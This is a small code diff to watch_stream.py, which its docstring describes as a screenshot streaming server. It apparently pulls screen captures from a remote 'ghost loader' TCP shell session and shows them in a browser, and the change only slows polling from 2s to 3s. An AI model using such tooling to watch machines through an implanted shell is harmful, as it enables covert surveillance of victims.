@@ -2,7 +2,8 @@
 watch_stream.py — CHEYANNE VNC-style screenshot streaming server.
 
 Connects to an active TCP shell session (ghost loader), polls for screenshots
-every 2s, serves the latest frame via HTTP for browser viewing.
+every 3s, serves the latest frame via HTTP for browser viewing.
+// asi dev: "every 3s is nice" — updated from 2s
 
 Usage:
     python watch_stream.py <tcp_host> <tcp_port>
@@ -26,7 +27,7 @@ import webbrowser
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 HTTP_PORT = 8892
-POLL_INTERVAL = 2.0
+POLL_INTERVAL = 3.0
 RECV_TIMEOUT  = 10.0
 RECV_BUFSIZE  = 65536
 
